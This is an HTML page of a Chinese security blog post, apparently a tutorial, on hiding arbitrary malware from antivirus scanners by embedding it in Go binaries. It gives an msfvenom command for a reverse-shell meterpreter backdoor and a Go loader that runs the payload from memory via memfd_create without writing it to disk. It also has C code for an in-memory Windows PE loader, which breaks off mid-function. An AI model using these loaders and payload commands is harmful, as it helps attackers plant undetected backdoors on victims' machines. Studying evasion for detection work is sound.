@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.font.im/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+<script data-ad-client="ca-pub-9381923643450020" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.wonderkun.cc","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文首发于安全客: https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;242549  前言平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别">
+<meta property="og:type" content="article">
+<meta property="og:title" content="杀软的无奈-最简单的免杀(二)">
+<meta property="og:url" content="http://blog.wonderkun.cc/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/index.html">
+<meta property="og:site_name" content="wonderkun&#39;s | blog">
+<meta property="og:description" content="本文首发于安全客: https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;242549  前言平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-51-03.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-22-10-39.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-00-58-55.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-04-57.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-06-11.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-14-47.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-20-12.png">
+<meta property="og:image" content="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-08-08-42.png">
+<meta property="article:published_time" content="2021-03-24T11:57:14.000Z">
+<meta property="article:modified_time" content="2024-11-18T11:46:14.722Z">
+<meta property="article:author" content="wonderkun">
+<meta property="article:tag" content="杀软的无奈">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png">
+
+<link rel="canonical" href="http://blog.wonderkun.cc/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>杀软的无奈-最简单的免杀(二) | wonderkun's | blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1a23c3c0cdc421d3cfd3c63dc9721ffe";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">wonderkun's | blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">share with you!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/wonderkun" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.wonderkun.cc/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+      <meta itemprop="name" content="wonderkun">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wonderkun's | blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          杀软的无奈-最简单的免杀(二)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-24 19:57:14" itemprop="dateCreated datePublished" datetime="2021-03-24T19:57:14+08:00">2021-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-18 19:46:14" itemprop="dateModified" datetime="2024-11-18T19:46:14+08:00">2024-11-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">学习记录</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/" class="post-meta-item leancloud_visitors" data-flag-title="杀软的无奈-最简单的免杀(二)" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/24/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%85%8D%E6%9D%80(%E4%BA%8C)/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/242549" target="_blank" rel="noopener">https://www.anquanke.com/post/id/242549</a></p>
+</blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>平时比较忙，抽不出来大把的时间来写文章，导致这个系列的更新太过于迟缓了。怕一直找理由鸽了自己，今天先更新一篇水文吧。主要说一下利用现成的工具完成比较简单的免杀工作。<br><strong>本文的核心目标是为了能够免杀任意的二进制，而不仅仅是为了免杀msf生成的shellcode，注意跟其他文章的区别</strong></p>
+<a id="more"></a>
+
+
+<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>今天要讲的主角其实是go语言。go语言是2009年google发布的语言，由于其有类似于c和c++一样的性能，同时还具备类似于解释性语言的垃圾回收机制，并且不像java一样依赖虚拟机，优秀的跨平台优势和1.4版本之后go语言实现的支持交叉编译的编译器，让它迅速火了起来。</p>
+<p>但是优秀的同时，它以牺牲自己二进制的体积为代价，每个go二进制都静态链接了一个runtime库，此库实现了垃圾回收、线程调度、go语言特有的关键特性等任务。此库的功能非常强大，因为导致一个简单的”hello world”就有1700多个函数。<br>有如此多的函数，那从这一堆函数中找出具有恶意功能的函数简直像大海捞针一样困难，这是市面上的大部分杀毒引擎对go二进制的检测能力比较薄弱的一个原因。</p>
+<p>本文主要是用go语言的相关工具，来彻底免杀之前会被查杀的elf恶意代码。(windows平台类似的方法，但是我并没有测试免杀效果。)</p>
+<h2 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h2><p><strong>基本思想就是把一个不免杀的ELF文件作为字节数据存储在go编写的二进制中，然后go二进制执行的时候从自身读出恶意代码然后直接加载到内存中执行，保证恶意代码不落盘</strong></p>
+<p>这个方法非常简单，不需要分析什么shellcode特征，甚至不需要写什么代码，就能实现效果不错的免杀，而且检测比较困难。</p>
+<p>可选的工具有很多:</p>
+<ul>
+<li><a href="https://github.com/gobuffalo/packr" target="_blank" rel="noopener">https://github.com/gobuffalo/packr</a></li>
+<li><a href="https://github.com/rakyll/statik" target="_blank" rel="noopener">https://github.com/rakyll/statik</a></li>
+<li><a href="https://github.com/GeertJohan/go.rice" target="_blank" rel="noopener">https://github.com/GeertJohan/go.rice</a></li>
+<li><a href="https://github.com/UnnoTed/fileb0x" target="_blank" rel="noopener">https://github.com/UnnoTed/fileb0x</a></li>
+<li><a href="https://github.com/mjibson/esc" target="_blank" rel="noopener">https://github.com/mjibson/esc</a></li>
+<li><a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a></li>
+<li><a href="https://github.com/lu4p/binclude" target="_blank" rel="noopener">https://github.com/lu4p/binclude</a></li>
+<li><a href="https://github.com/omeid/go-resources" target="_blank" rel="noopener">https://github.com/omeid/go-resources</a></li>
+<li><a href="https://github.com/pyros2097/go-embed" target="_blank" rel="noopener">https://github.com/pyros2097/go-embed</a></li>
+<li><a href="https://github.com/wlbr/mule" target="_blank" rel="noopener">https://github.com/wlbr/mule</a></li>
+<li><a href="https://github.com/miscing/embed" target="_blank" rel="noopener">https://github.com/miscing/embed</a></li>
+<li><a href="https://github.com/kyioptr/gassets" target="_blank" rel="noopener">https://github.com/kyioptr/gassets</a></li>
+</ul>
+<p>甚至 go1.6 就默认支持<a href="https://go.googlesource.com/proposal/+/master/design/draft-embed.md" target="_blank" rel="noopener">https://go.googlesource.com/proposal/+/master/design/draft-embed.md</a> ，你说开心不开心，默认支持的能有啥特征呢？ 哈哈哈哈</p>
+<p>下面就先使用 <a href="https://github.com/kevinburke/go-bindata" target="_blank" rel="noopener">https://github.com/kevinburke/go-bindata</a> 来测试一下效果。</p>
+<h2 id="linux平台免杀"><a href="#linux平台免杀" class="headerlink" title="linux平台免杀"></a>linux平台免杀</h2><ol>
+<li>用msf生成一个后门</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=192.168.1.1 lport=6666 -f elf &gt; ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>这个样本肯定是不免杀的，上传到virustotal上看一下。</p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-38-06.png" alt=""></p>
+<p>竟然才仅有4款杀毒软件报毒，这太出乎意料了，是杀毒软件提不动刀了，还是metasploit的编码器太强了？不过 anyway，我们还是用go去加载这个二进制，看一下效果。</p>
+<ol start="2">
+<li>使用go-bindata 打包到一个文件中</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/kevinburke/go-bindata</span></span><br><span class="line">./go-bindata ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就会生成一个  <code>bindata.go</code> 的文件，里面以压缩字节的形式存储这 ./test 的数据。</p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-21-51-03.png" alt=""></p>
+<p>接下来在 <code>bindata.go</code> 中编写main函数，来让test文件从内存执行:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	mfdCloexec  = <span class="number">0x0001</span> <span class="comment">// 注意这个syscall 只有 3.17 之后的内核才支持,现在大部分的机器都支持了。</span></span><br><span class="line">	memfdCreate = <span class="number">319</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	</span><br><span class="line">	data, err := Asset(<span class="string">"test"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="comment">// Asset was not found.</span></span><br><span class="line">		fmt.Println(<span class="string">"read test file content error!"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	filename := <span class="string">""</span></span><br><span class="line"></span><br><span class="line">	fd, _, _ := syscall.Syscall(memfdCreate, <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;filename)), <span class="keyword">uintptr</span>(mfdCloexec), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	_, _ = syscall.Write(<span class="keyword">int</span>(fd), data)</span><br><span class="line">	displayName := <span class="string">"/bin/bash"</span></span><br><span class="line"></span><br><span class="line">	fdPath := fmt.Sprintf(<span class="string">"/proc/self/fd/%d"</span>, fd)</span><br><span class="line">	_ = syscall.Exec(fdPath, []<span class="keyword">string</span>&#123;displayName&#125;, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译之后，发现这个后门功能正常，上传到 virustotal 再看一下效果。</p>
+<p><img src="https://pic.wonderkun.cc/uploads/2021/03/2021-03-25-22-10-39.png" alt=""></p>
+<p>效果还算理想。这里可以放任意的会被杀软干掉的二进制，应该免杀效果都是杠杠的。 </p>
+<h2 id="windows平台免杀"><a href="#windows平台免杀" class="headerlink" title="windows平台免杀"></a>windows平台免杀</h2><p>windows平台上也是同样的道理，只是windows没有 <code>memfd_create</code> 这样方便的syscall供我们调用，但是 「exe_run_in_memory」也很容易实现，下面我们尝试简单讲一下过程。<br>「exe_run_in_memory」可以直接用go语言实现，但是需要自己定义很多结构，而且不能像c语言那样便捷的处理PE结构，所以本文为了节省时间，直接复用了之前c语言来实现的加载的代码，然后用cgo进行调用。</p>
+<p>用c语言来实现内存的map：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">mapping</span><span class="params">(LPVOID lpData, LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	<span class="comment">// 获取SizeOfHeaders的值: 所有头+节表头的大小</span></span><br><span class="line">	DWORD dwSizeOfHeaders = pNtHeaders-&gt;OptionalHeader.SizeOfHeaders;</span><br><span class="line">	<span class="comment">// 获取节表的数量</span></span><br><span class="line">	WORD wNumberOfSections = pNtHeaders-&gt;FileHeader.NumberOfSections;</span><br><span class="line">	<span class="comment">// 获取第一个节表头的地址</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pNtHeaders + sizeof(IMAGE_NT_HEADERS));</span></span><br><span class="line"><span class="comment">	这样计算是错误的,因为 64 位程序和 32 位程序 IMAGE_NT_HEADERS 的大小不一样</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;</span><br><span class="line">	   <span class="comment">// 32 位镜像 </span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS32));</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span> (pNtHeaders-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;</span><br><span class="line"></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((UNPTR)pNtHeaders + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS64));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="comment">// 无法识别的 EXE 镜像 </span></span><br><span class="line">		ShowError(<span class="string">"cann't identify file format."</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 加载 所有头+节表头的大小</span></span><br><span class="line">	<span class="built_in">memcpy</span>(lpBaseAddress, lpData, dwSizeOfHeaders);</span><br><span class="line">	<span class="comment">// 对齐SectionAlignment循环加载节表</span></span><br><span class="line">	WORD i = <span class="number">0</span>;</span><br><span class="line">	LPVOID lpSrcMem = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID lpDestMem = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwSizeOfRawData = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; wNumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="number">0</span> == pSectionHeader-&gt;VirtualAddress) ||</span><br><span class="line">			(<span class="number">0</span> == pSectionHeader-&gt;SizeOfRawData))</span><br><span class="line">		&#123;</span><br><span class="line">			pSectionHeader++;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		lpSrcMem = (LPVOID)((UNPTR)lpData + pSectionHeader-&gt;PointerToRawData);</span><br><span class="line">		lpDestMem = (LPVOID)((UNPTR)lpBaseAddress + pSectionHeader-&gt;VirtualAddress);</span><br><span class="line">		dwSizeOfRawData = pSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">		<span class="built_in">memcpy</span>(lpDestMem, lpSrcMem, dwSizeOfRawData);</span><br><span class="line"></span><br><span class="line">		pSectionHeader++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解析导入表,并修改IAT地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">doImTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((UNPTR)pDosHeader + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImportTable = <span class="literal">NULL</span>;</span><br><span class="line">	